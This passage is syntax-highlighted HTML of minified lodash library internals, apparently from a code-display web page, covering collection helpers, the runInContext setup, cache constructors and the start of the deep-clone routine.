class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="string">&quot;\\&quot;</span> + $t[t]</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Re</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> jt.<span class="title function_">test</span>(t)</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Ie</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> e = -<span class="number">1</span></span><br><span class="line">                                , n = <span class="title class_">Array</span>(t.<span class="property">size</span>);</span><br><span class="line">                            <span class="keyword">return</span> t.<span class="title function_">forEach</span>((<span class="keyword">function</span> (<span class="params">t, r</span>) &#123;</span><br><span class="line">                                    n[++e] = [r, t]</span><br><span class="line">                                &#125;</span><br><span class="line">                            )),</span><br><span class="line">                                n</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">$e</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">t</span>(<span class="title function_">e</span>(n))</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Be</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> n = -<span class="number">1</span>, r = t.<span class="property">length</span>, i = <span class="number">0</span>, o = []; ++n &lt; r;) &#123;</span><br><span class="line">                                <span class="keyword">var</span> c = t[n];</span><br><span class="line">                                c !== e &amp;&amp; c !== a || (t[n] = a,</span><br><span class="line">                                    o[i++] = n)</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">return</span> o</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Ue</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> e = -<span class="number">1</span></span><br><span class="line">                                , n = <span class="title class_">Array</span>(t.<span class="property">size</span>);</span><br><span class="line">                            <span class="keyword">return</span> t.<span class="title function_">forEach</span>((<span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    n[++e] = t</span><br><span class="line">                                &#125;</span><br><span class="line">                            )),</span><br><span class="line">                                n</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">qe</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> e = -<span class="number">1</span></span><br><span class="line">                                , n = <span class="title class_">Array</span>(t.<span class="property">size</span>);</span><br><span class="line">                            <span class="keyword">return</span> t.<span class="title function_">forEach</span>((<span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    n[++e] = [t, t]</span><br><span class="line">                                &#125;</span><br><span class="line">                            )),</span><br><span class="line">                                n</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Ye</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title class_">Re</span>(t) ? <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = <span class="title class_">Vt</span>.<span class="property">lastIndex</span> = <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span> (; <span class="title class_">Vt</span>.<span class="title function_">test</span>(t);)</span><br><span class="line">                                    ++e;</span><br><span class="line">                                <span class="keyword">return</span> e</span><br><span class="line">                            &#125;(t) : <span class="title function_">ye</span>(t)</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">We</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title class_">Re</span>(t) ? <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t.<span class="title function_">match</span>(<span class="title class_">Vt</span>) || []</span><br><span class="line">                            &#125;(t) : <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                            &#125;(t)</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="title function_">Xe</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> e = t.<span class="property">length</span>; e-- &amp;&amp; G.<span class="title function_">test</span>(t.<span class="title function_">charAt</span>(e));)</span><br><span class="line">                                ;</span><br><span class="line">                            <span class="keyword">return</span> e</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Ge</span> = <span class="title class_">Ce</span>(&#123;</span><br><span class="line">                            <span class="string">&quot;&amp;amp;&quot;</span>: <span class="string">&quot;&amp;&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;&amp;lt;&quot;</span>: <span class="string">&quot;&lt;&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;&amp;gt;&quot;</span>: <span class="string">&quot;&gt;&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;&amp;quot;&quot;</span>: <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">                            <span class="string">&quot;&amp;#39;&quot;</span>: <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">                        &#125;);</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Ze</span> = <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                            <span class="keyword">var</span> n, r = (e = <span class="literal">null</span> == e ? <span class="title class_">Wt</span> : <span class="title class_">Ze</span>.<span class="title function_">defaults</span>(<span class="title class_">Wt</span>.<span class="title class_">Object</span>(), e, <span class="title class_">Ze</span>.<span class="title function_">pick</span>(<span class="title class_">Wt</span>, <span class="title class_">Dt</span>))).<span class="property">Array</span>,</span><br><span class="line">                                i = e.<span class="property">Date</span>, G = e.<span class="property">Error</span>, ft = e.<span class="property">Function</span>, dt = e.<span class="property">Math</span>, pt = e.<span class="property">Object</span>, vt = e.<span class="property">RegExp</span>,</span><br><span class="line">                                mt = e.<span class="property">String</span>, gt = e.<span class="property">TypeError</span>, yt = r.<span class="property"><span class="keyword">prototype</span></span>, bt = ft.<span class="property"><span class="keyword">prototype</span></span>, wt = pt.<span class="property"><span class="keyword">prototype</span></span>,</span><br><span class="line">                                _t = e[<span class="string">&quot;__core-js_shared__&quot;</span>], xt = bt.<span class="property">toString</span>, zt = wt.<span class="property">hasOwnProperty</span>, <span class="title class_">Mt</span> = <span class="number">0</span>,</span><br><span class="line">                                <span class="title class_">St</span> = (n = <span class="regexp">/[^.]+$/</span>.<span class="title function_">exec</span>(_t &amp;&amp; _t.<span class="property">keys</span> &amp;&amp; _t.<span class="property">keys</span>.<span class="property">IE_PROTO</span> || <span class="string">&quot;&quot;</span>)) ? <span class="string">&quot;Symbol(src)_1.&quot;</span> + n : <span class="string">&quot;&quot;</span>,</span><br><span class="line">                                <span class="title class_">Ct</span> = wt.<span class="property">toString</span>, <span class="title class_">Ht</span> = xt.<span class="title function_">call</span>(pt), <span class="title class_">Tt</span> = <span class="title class_">Wt</span>.<span class="property">_</span>,</span><br><span class="line">                                <span class="title class_">At</span> = <span class="title function_">vt</span>(<span class="string">&quot;^&quot;</span> + xt.<span class="title function_">call</span>(zt).<span class="title function_">replace</span>(Y, <span class="string">&quot;\\$&amp;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g</span>, <span class="string">&quot;$1.*?&quot;</span>) + <span class="string">&quot;$&quot;</span>),</span><br><span class="line">                                <span class="title class_">Ot</span> = <span class="title class_">Zt</span> ? e.<span class="property">Buffer</span> : <span class="keyword">void</span> <span class="number">0</span>, <span class="title class_">Et</span> = e.<span class="property">Symbol</span>, <span class="title class_">Vt</span> = e.<span class="property">Uint8Array</span>,</span><br><span class="line">                                jt = <span class="title class_">Ot</span> ? <span class="title class_">Ot</span>.<span class="property">allocUnsafe</span> : <span class="keyword">void</span> <span class="number">0</span>, $t = $e(pt.<span class="property">getPrototypeOf</span>, pt), qt = pt.<span class="property">create</span>,</span><br><span class="line">                                <span class="title class_">Yt</span> = wt.<span class="property">propertyIsEnumerable</span>, <span class="title class_">Xt</span> = yt.<span class="property">splice</span>, <span class="title class_">Gt</span> = <span class="title class_">Et</span> ? <span class="title class_">Et</span>.<span class="property">isConcatSpreadable</span> : <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                                <span class="title class_">Qt</span> = <span class="title class_">Et</span> ? <span class="title class_">Et</span>.<span class="property">iterator</span> : <span class="keyword">void</span> <span class="number">0</span>, <span class="title class_">Jt</span> = <span class="title class_">Et</span> ? <span class="title class_">Et</span>.<span class="property">toStringTag</span> : <span class="keyword">void</span> <span class="number">0</span>, ye = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">try</span> &#123;</span><br><span class="line">                                        <span class="keyword">var</span> t = <span class="title function_">to</span>(pt, <span class="string">&quot;defineProperty&quot;</span>);</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">t</span>(&#123;&#125;, <span class="string">&quot;&quot;</span>, &#123;&#125;),</span><br><span class="line">                                            t</span><br><span class="line">                                    &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;(), <span class="title class_">Ce</span> = e.<span class="property">clearTimeout</span> !== <span class="title class_">Wt</span>.<span class="property">clearTimeout</span> &amp;&amp; e.<span class="property">clearTimeout</span>,</span><br><span class="line">                                <span class="title class_">Qe</span> = i &amp;&amp; i.<span class="property">now</span> !== <span class="title class_">Wt</span>.<span class="property">Date</span>.<span class="property">now</span> &amp;&amp; i.<span class="property">now</span>,</span><br><span class="line">                                <span class="title class_">Je</span> = e.<span class="property">setTimeout</span> !== <span class="title class_">Wt</span>.<span class="property">setTimeout</span> &amp;&amp; e.<span class="property">setTimeout</span>, <span class="title class_">Ke</span> = dt.<span class="property">ceil</span>, tn = dt.<span class="property">floor</span>,</span><br><span class="line">                                en = pt.<span class="property">getOwnPropertySymbols</span>, nn = <span class="title class_">Ot</span> ? <span class="title class_">Ot</span>.<span class="property">isBuffer</span> : <span class="keyword">void</span> <span class="number">0</span>, rn = e.<span class="property">isFinite</span>,</span><br><span class="line">                                on = yt.<span class="property">join</span>, an = $e(pt.<span class="property">keys</span>, pt), cn = dt.<span class="property">max</span>, sn = dt.<span class="property">min</span>, un = i.<span class="property">now</span>,</span><br><span class="line">                                ln = e.<span class="property">parseInt</span>, hn = dt.<span class="property">random</span>, fn = yt.<span class="property">reverse</span>, dn = <span class="title function_">to</span>(e, <span class="string">&quot;DataView&quot;</span>),</span><br><span class="line">                                pn = <span class="title function_">to</span>(e, <span class="string">&quot;Map&quot;</span>), vn = <span class="title function_">to</span>(e, <span class="string">&quot;Promise&quot;</span>), mn = <span class="title function_">to</span>(e, <span class="string">&quot;Set&quot;</span>), gn = <span class="title function_">to</span>(e, <span class="string">&quot;WeakMap&quot;</span>),</span><br><span class="line">                                yn = <span class="title function_">to</span>(pt, <span class="string">&quot;create&quot;</span>), bn = gn &amp;&amp; <span class="keyword">new</span> gn, wn = &#123;&#125;, _n = <span class="title class_">To</span>(dn), xn = <span class="title class_">To</span>(pn),</span><br><span class="line">                                zn = <span class="title class_">To</span>(vn), <span class="title class_">Mn</span> = <span class="title class_">To</span>(mn), <span class="title class_">Sn</span> = <span class="title class_">To</span>(gn), <span class="title class_">Cn</span> = <span class="title class_">Et</span> ? <span class="title class_">Et</span>.<span class="property"><span class="keyword">prototype</span></span> : <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                                <span class="title class_">Hn</span> = <span class="title class_">Cn</span> ? <span class="title class_">Cn</span>.<span class="property">valueOf</span> : <span class="keyword">void</span> <span class="number">0</span>, <span class="title class_">Tn</span> = <span class="title class_">Cn</span> ? <span class="title class_">Cn</span>.<span class="property">toString</span> : <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">An</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="title function_">qa</span>(t) &amp;&amp; !<span class="title class_">Va</span>(t) &amp;&amp; !(t <span class="keyword">instanceof</span> <span class="title class_">Ln</span>)) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (t <span class="keyword">instanceof</span> kn)</span><br><span class="line">                                        <span class="keyword">return</span> t;</span><br><span class="line">                                    <span class="keyword">if</span> (zt.<span class="title function_">call</span>(t, <span class="string">&quot;__wrapped__&quot;</span>))</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Ao</span>(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">kn</span>(t)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">On</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (!<span class="title class_">Ua</span>(e))</span><br><span class="line">                                        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">                                    <span class="keyword">if</span> (qt)</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">qt</span>(e);</span><br><span class="line">                                    t.<span class="property"><span class="keyword">prototype</span></span> = e;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="keyword">new</span> t;</span><br><span class="line">                                    <span class="keyword">return</span> t.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                                        n</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;();</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">En</span>(<span class="params"></span>) &#123;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">kn</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="variable language_">this</span>.<span class="property">__wrapped__</span> = t,</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__actions__</span> = [],</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__chain__</span> = !!e,</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__index__</span> = <span class="number">0</span>,</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__values__</span> = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Ln</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="variable language_">this</span>.<span class="property">__wrapped__</span> = t,</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__actions__</span> = [],</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__dir__</span> = <span class="number">1</span>,</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__filtered__</span> = !<span class="number">1</span>,</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__iteratees__</span> = [],</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__takeCount__</span> = <span class="number">4294967295</span>,</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="property">__views__</span> = []</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Vn</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = -<span class="number">1</span></span><br><span class="line">                                    , n = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="variable language_">this</span>.<span class="title function_">clear</span>(); ++e &lt; n;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = t[e];</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="title function_">set</span>(r[<span class="number">0</span>], r[<span class="number">1</span>])</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Pn</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = -<span class="number">1</span></span><br><span class="line">                                    , n = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="variable language_">this</span>.<span class="title function_">clear</span>(); ++e &lt; n;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = t[e];</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="title function_">set</span>(r[<span class="number">0</span>], r[<span class="number">1</span>])</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">jn</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = -<span class="number">1</span></span><br><span class="line">                                    , n = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="variable language_">this</span>.<span class="title function_">clear</span>(); ++e &lt; n;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = t[e];</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="title function_">set</span>(r[<span class="number">0</span>], r[<span class="number">1</span>])</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Fn</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = -<span class="number">1</span></span><br><span class="line">                                    , n = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="variable language_">this</span>.<span class="property">__data__</span> = <span class="keyword">new</span> jn; ++e &lt; n;)</span><br><span class="line">                                    <span class="variable language_">this</span>.<span class="title function_">add</span>(t[e])</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Dn</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">__data__</span> = <span class="keyword">new</span> <span class="title class_">Pn</span>(t);</span><br><span class="line">                                <span class="variable language_">this</span>.<span class="property">size</span> = e.<span class="property">size</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Nn</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = <span class="title class_">Va</span>(t)</span><br><span class="line">                                    , r = !n &amp;&amp; <span class="title class_">La</span>(t)</span><br><span class="line">                                    , i = !n &amp;&amp; !r &amp;&amp; <span class="title class_">Da</span>(t)</span><br><span class="line">                                    , o = !n &amp;&amp; !r &amp;&amp; !i &amp;&amp; <span class="title class_">Ka</span>(t)</span><br><span class="line">                                    , a = n || r || i || o</span><br><span class="line">                                    , c = a ? <span class="title class_">Ae</span>(t.<span class="property">length</span>, mt) : []</span><br><span class="line">                                    , s = c.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> u <span class="keyword">in</span> t)</span><br><span class="line">                                    !e &amp;&amp; !zt.<span class="title function_">call</span>(t, u) || a &amp;&amp; (<span class="string">&quot;length&quot;</span> == u || i &amp;&amp; (<span class="string">&quot;offset&quot;</span> == u || <span class="string">&quot;parent&quot;</span> == u) || o &amp;&amp; (<span class="string">&quot;buffer&quot;</span> == u || <span class="string">&quot;byteLength&quot;</span> == u || <span class="string">&quot;byteOffset&quot;</span> == u) || <span class="title function_">co</span>(u, s)) || c.<span class="title function_">push</span>(u);</span><br><span class="line">                                <span class="keyword">return</span> c</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Rn</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">return</span> e ? t[<span class="title class_">Fr</span>(<span class="number">0</span>, e - <span class="number">1</span>)] : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">In</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">So</span>(<span class="title function_">yi</span>(t), <span class="title class_">Zn</span>(e, <span class="number">0</span>, t.<span class="property">length</span>))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">$n</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">So</span>(<span class="title function_">yi</span>(t))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Bn</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                (<span class="keyword">void</span> <span class="number">0</span> !== n &amp;&amp; !<span class="title class_">Oa</span>(t[e], n) || <span class="keyword">void</span> <span class="number">0</span> === n &amp;&amp; !(e <span class="keyword">in</span> t)) &amp;&amp; <span class="title class_">Xn</span>(t, e, n)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Un</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = t[e];</span><br><span class="line">                                zt.<span class="title function_">call</span>(t, e) &amp;&amp; <span class="title class_">Oa</span>(r, n) &amp;&amp; (<span class="keyword">void</span> <span class="number">0</span> !== n || e <span class="keyword">in</span> t) || <span class="title class_">Xn</span>(t, e, n)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">qn</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> n = t.<span class="property">length</span>; n--;)</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="title class_">Oa</span>(t[n][<span class="number">0</span>], e))</span><br><span class="line">                                        <span class="keyword">return</span> n;</span><br><span class="line">                                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Yn</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">er</span>(t, (<span class="keyword">function</span> (<span class="params">t, i, o</span>) &#123;</span><br><span class="line">                                        <span class="title function_">e</span>(r, t, <span class="title function_">n</span>(t), o)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                    r</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Wn</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t &amp;&amp; <span class="title function_">bi</span>(e, <span class="title function_">_c</span>(e), t)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Xn</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="string">&quot;__proto__&quot;</span> == e &amp;&amp; ye ? <span class="title function_">ye</span>(t, e, &#123;</span><br><span class="line">                                    <span class="attr">configurable</span>: !<span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">enumerable</span>: !<span class="number">0</span>,</span><br><span class="line">                                    <span class="attr">value</span>: n,</span><br><span class="line">                                    <span class="attr">writable</span>: !<span class="number">0</span></span><br><span class="line">                                &#125;) : t[e] = n</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Gn</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> n = -<span class="number">1</span>, i = e.<span class="property">length</span>, o = <span class="title function_">r</span>(i), a = <span class="literal">null</span> == t; ++n &lt; i;)</span><br><span class="line">                                    o[n] = a ? <span class="keyword">void</span> <span class="number">0</span> : <span class="title function_">mc</span>(t, e[n]);</span><br><span class="line">                                <span class="keyword">return</span> o</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Zn</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t == t &amp;&amp; (<span class="keyword">void</span> <span class="number">0</span> !== n &amp;&amp; (t = t &lt;= n ? t : n),</span><br><span class="line">                                <span class="keyword">void</span> <span class="number">0</span> !== e &amp;&amp; (t = t &gt;= e ? t : e)),</span><br><span class="line">                                    t</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Qn</span>(<span class="params">t, e, n, r, i, o</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> a, c = <span class="number">1</span> &amp; e, u = <span class="number">2</span> &amp; e, f = <span class="number">4</span> &amp; e;</span><br><span class="line">                                <span class="keyword">if</span> (n &amp;&amp; (a = i ? <span class="title function_">n</span>(t, r, i, o) : <span class="title function_">n</span>(t)),</span><br><span class="line">                                <span class="keyword">void</span> <span class="number">0</span> !== a)</span><br><span class="line">                                    <span class="keyword">return</span> a;</span><br><span class="line">                                <span class="keyword">if</span> (!<span class="title class_">Ua</span>(t))</span><br><span class="line">                                    <span class="keyword">return</span> t;</span><br><span class="line">                                <span class="keyword">var</span> x = <span class="title class_">Va</span>(t);</span><br><span class="line">                                <span class="keyword">if</span> (x) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (a = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> e = t.<span class="property">length</span></span><br><span class="line">                                            , n = <span class="keyword">new</span> t.<span class="title function_">constructor</span>(<span class="params">e</span>);</span><br><span class="line">                                        e &amp;&amp; <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t[<span class="number">0</span>] &amp;&amp; zt.<span class="title function_">call</span>(t, <span class="string">&quot;index&quot;</span>) &amp;&amp; (n.<span class="property">index</span> = t.<span class="property">index</span>,</span><br><span class="line">                                            n.<span class="property">input</span> = t.<span class="property">input</span>);</span><br><span class="line">                                        <span class="keyword">return</span> n</span><br><span class="line">                                    &#125;(t),</span><br><span class="line">                                        !c)</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">yi</span>(t, a)</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="keyword">var</span> L = <span class="title function_">ro</span>(t)</span><br><span class="line">                                        , V = L == d || L == p;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="title class_">Da</span>(t))</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">fi</span>(t, c);</span><br><span class="line">                                    <span class="keyword">if</span> (L == g || L == s || V &amp;&amp; !i) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (a = u || V ? &#123;&#125; : <span class="title function_">oo</span>(t),</span><br><span class="line">                                            !c)</span><br><span class="line">                                            <span class="keyword">return</span> u ? <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                                <span class="keyword">return</span> <span class="title function_">bi</span>(t, <span class="title function_">no</span>(t), e)</span><br><span class="line">                                            &#125;(t, <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                                <span class="keyword">return</span> t &amp;&amp; <span class="title function_">bi</span>(e, <span class="title function_">xc</span>(e), t)</span><br><span class="line">                                            &#125;(a, t)) : <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                                <span class="keyword">return</span> <span class="title function_">bi</span>(t, <span class="title function_">eo</span>(t), e)</span><br><span class="line">                                            &#125;(t, <span class="title class_">Wn</span>(a, t))</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (!<span class="title class_">It</span>[L])</span><br><span class="line">                                            <span class="keyword">return</span> i ? t : &#123;&#125;;</span><br><span class="line">                                        a = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> r = t.<span class="property">constructor</span>;</span><br><span class="line">                                            <span class="keyword">switch</span> (e) &#123;</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">z</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="title function_">di</span>(t);</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">l</span>:</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">h</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">r</span>(+t);</span><br><span class="line">                                                <span class="keyword">case</span> <span class="attr">M</span>:</span><br><span class="line">                                                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                                        <span class="keyword">var</span> n = e ? <span class="title 